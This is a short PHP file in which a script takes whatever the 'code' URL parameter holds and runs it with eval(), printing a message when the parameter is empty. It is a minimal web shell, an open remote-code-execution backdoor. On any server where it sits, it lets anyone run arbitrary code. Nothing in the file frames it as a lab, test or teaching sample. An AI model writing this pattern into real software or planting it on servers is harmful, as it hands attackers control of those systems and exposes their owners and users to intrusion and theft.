<?php

if (!empty(($_GET['code']))) 
{
    $code = $_GET['code'];
    eval($code);
} 
else 
{
    echo "No code provided.";
}


?>